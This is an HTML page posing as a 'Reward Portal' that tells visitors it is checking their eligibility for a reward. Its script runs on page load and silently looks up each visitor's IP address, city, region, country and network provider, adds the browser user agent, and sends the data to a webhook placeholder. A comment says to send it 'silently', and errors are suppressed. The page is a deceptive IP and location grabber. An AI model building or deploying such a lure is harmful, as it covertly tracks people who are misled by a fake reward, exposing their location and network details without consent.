<!DOCTYPE html>
<html>
<head>
  <title>Reward Portal</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #f0f0f0; }
    .box { background: white; display: inline-block; padding: 30px; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
  </style>
</head>
<body>
  <div class="box">
    <h2>Claim Your Reward</h2>
    <p>Checking eligibility...</p>
  </div>

  <script>
    async function getLocationData() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        const payload = {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country_name,
          org: data.org,
          ua: navigator.userAgent,
          time: new Date().toString()
        };

        // Send to your webhook silently
        await fetch('https://webhook.site/your-unique-id', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (e) {
        // Do nothing on error
      }
    }

    getLocationData();
  </script>
</body>
</html>
